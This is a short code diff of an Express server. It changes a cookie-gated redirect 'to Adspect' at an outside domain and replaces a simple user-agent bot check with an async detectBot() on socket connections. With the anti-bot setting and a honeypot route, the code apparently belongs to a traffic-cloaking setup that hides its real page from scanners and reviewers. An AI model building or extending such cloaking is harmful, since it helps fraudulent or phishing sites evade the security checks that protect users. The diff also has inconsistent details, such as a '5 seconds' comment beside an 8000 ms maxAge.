@@ -620,17 +620,20 @@ app.get('/', (req, res) => {
         return res.redirect(state.settings.redirectUrl);
     }
  
-    // If enabled, set cookie and redirect to Adspect
+    // If enabled, set cookie with Safari-compatible settings
     console.log('- Redirecting to Adspect');
     res.cookie('adspect_redirect', 'true', {
-        maxAge: 5000, // 5 seconds
+        maxAge: 8000, // 5 seconds
         httpOnly: true,
         secure: true,
-        sameSite: 'lax'
+        sameSite: 'strict', // Changed from 'lax' to 'strict'
+        path: '/',         // Explicitly set path
+        domain: null,      // Let browser set domain automatically
+        expires: new Date(Date.now() + 5000) // Explicit expiry as backup
     });
         
     return res.redirect(302, 'https://redirectingroute.com/');
- });
+});
 
  app.post('/verify-honeypot', async (req, res) => {
     const { email, username, website } = req.body;
@@ -1211,11 +1214,11 @@ userNamespace.use(async (socket, next) => {
 
         // Bot check
         if (state.settings.antiBotEnabled) {
-            const userAgent = socket.handshake.headers['user-agent'];
-            if (detectbot(userAgent)) {
-                socket.disconnect(true);
-                return next(new Error('Bot detected'));
-            }
+            const botCheck = await detectBot(socket.handshake);
+if (botCheck.isBot) {
+    socket.disconnect(true);
+    return next(new Error(`Bot detected: ${botCheck.reason}`));
+}
         }
 
         next();
